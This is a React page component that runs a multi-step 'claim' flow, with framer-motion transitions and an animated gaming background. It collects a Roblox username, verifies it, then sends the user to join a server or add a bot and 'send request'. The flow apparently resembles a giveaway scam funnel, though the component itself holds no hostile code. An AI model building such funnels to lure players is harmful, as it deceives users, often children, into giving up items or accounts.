import { useState } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { ProgressIndicator } from "@/components/claim/progress-indicator";
import { ClaimForm } from "@/components/claim/claim-form";
import { UserVerification } from "@/components/claim/user-verification";
import { AttentionPage } from "@/components/claim/attention-page";
import { BotPage } from "@/components/claim/bot-page";
import { FinalConfirmation } from "@/components/claim/final-confirmation";
import { ThankYouPage } from "@/components/claim/thank-you-page";
import type { ClaimFormData } from "@shared/schema";

export type ClaimStep = "claim" | "verification" | "attention" | "bot" | "confirmation" | "thanks";

export default function ClaimPage() {
  const [currentStep, setCurrentStep] = useState<ClaimStep>("claim");
  const [claimData, setClaimData] = useState<ClaimFormData | null>(null);

  // Calculate progress more intelligently based on flow
  const getProgressInfo = () => {
    const stepMap = {
      "claim": { step: 1, total: 5 },
      "verification": { step: 2, total: 5 },
      "attention": { step: 3, total: 5 },
      "bot": { step: 4, total: 5 },
      "confirmation": { step: 4, total: 5 },
      "thanks": { step: 5, total: 5 }
    };
    return stepMap[currentStep];
  };

  const handleClaimSubmit = (data: ClaimFormData) => {
    setClaimData(data);
    setCurrentStep("verification");
  };

  const handleVerificationConfirm = () => {
    setCurrentStep("attention");
  };

  const handleVerificationBack = () => {
    setCurrentStep("claim");
  };

  const handleAttentionJoinServer = () => {
    setCurrentStep("confirmation");
  };

  const handleAttentionAddBot = () => {
    setCurrentStep("bot");
  };

  const handleBotSendRequest = () => {
    setCurrentStep("thanks");
  };

  const handleConfirmationComplete = () => {
    setCurrentStep("thanks");
  };

  const pageVariants = {
    initial: {
      opacity: 0,
      y: 50,
      scale: 0.95,
    },
    in: {
      opacity: 1,
      y: 0,
      scale: 1,
    },
    out: {
      opacity: 0,
      y: -50,
      scale: 1.05,
    },
  };

  const pageTransition = {
    type: "tween",
    ease: "anticipate",
    duration: 0.5,
  };

  return (
    <div className="min-h-screen relative overflow-hidden">
      {/* Animated Gaming Background */}
      <div className="absolute inset-0 overflow-hidden pointer-events-none">
        <div className="absolute top-20 left-10 w-20 h-20 bg-primary/20 rounded-full floating-shape"></div>
        <div className="absolute top-40 right-20 w-16 h-16 bg-secondary/20 rounded-lg floating-shape-delayed"></div>
        <div className="absolute bottom-20 left-20 w-24 h-24 bg-accent/20 rounded-full floating-shape-slow"></div>
        <div className="absolute bottom-40 right-10 w-12 h-12 bg-primary/20 rounded-lg floating-shape"></div>
        <div className="absolute top-1/2 left-1/2 w-32 h-32 bg-accent/10 rounded-full floating-shape-delayed transform -translate-x-1/2 -translate-y-1/2"></div>
        <div className="absolute top-60 left-1/4 w-8 h-8 bg-secondary/30 rounded-full floating-shape-slow"></div>
        <div className="absolute bottom-60 right-1/4 w-14 h-14 bg-primary/15 rounded-lg floating-shape"></div>
      </div>

      {/* Main Content */}
      <div className="relative z-10 container mx-auto px-4 py-8">
        <ProgressIndicator 
          currentStep={getProgressInfo().step} 
          totalSteps={getProgressInfo().total} 
        />

        <AnimatePresence mode="wait">
          {currentStep === "claim" && (
            <motion.div
              key="claim"
              initial="initial"
              animate="in"
              exit="out"
              variants={pageVariants}
              transition={pageTransition}
            >
              <ClaimForm onSubmit={handleClaimSubmit} />
            </motion.div>
          )}

          {currentStep === "verification" && claimData && (
            <motion.div
              key="verification"
              initial="initial"
              animate="in"
              exit="out"
              variants={pageVariants}
              transition={pageTransition}
            >
              <UserVerification
                username={claimData.robloxUsername}
                onConfirm={handleVerificationConfirm}
                onGoBack={handleVerificationBack}
                formData={claimData}
              />
            </motion.div>
          )}

          {currentStep === "attention" && (
            <motion.div
              key="attention"
              initial="initial"
              animate="in"
              exit="out"
              variants={pageVariants}
              transition={pageTransition}
            >
              <AttentionPage 
                onJoinServer={handleAttentionJoinServer}
                onAddBot={handleAttentionAddBot}
              />
            </motion.div>
          )}

          {currentStep === "bot" && (
            <motion.div
              key="bot"
              initial="initial"
              animate="in"
              exit="out"
              variants={pageVariants}
              transition={pageTransition}
            >
              <BotPage onSendRequest={handleBotSendRequest} />
            </motion.div>
          )}

          {currentStep === "confirmation" && (
            <motion.div
              key="confirmation"
              initial="initial"
              animate="in"
              exit="out"
              variants={pageVariants}
              transition={pageTransition}
            >
              <FinalConfirmation onComplete={handleConfirmationComplete} />
            </motion.div>
          )}

          {currentStep === "thanks" && (
            <motion.div
              key="thanks"
              initial="initial"
              animate="in"
              exit="out"
              variants={pageVariants}
              transition={pageTransition}
            >
              <ThankYouPage />
            </motion.div>
          )}
        </AnimatePresence>
      </div>
    </div>
  );
}
